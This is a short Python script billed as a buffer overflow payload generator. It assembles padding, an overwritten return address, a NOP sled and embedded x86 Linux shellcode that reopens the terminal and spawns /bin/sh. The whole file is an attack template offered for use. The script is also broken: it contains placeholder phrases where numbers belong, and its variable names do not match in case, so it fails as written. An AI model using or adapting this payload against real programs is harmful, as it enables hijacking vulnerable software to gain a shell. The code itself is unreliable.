import struct
print("WELCOME TO THE BUFFER OVERFLOW PAYLOAD GENERATOR MADE BY MR.PAVITRA JHA") 
pad = "\x41" * number of padding you need 
Eip = struct.pack("I", the eip)
Shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
Nop = "\x90" * number of nops you need 
print(pad + EIP + NOP + shellcode)

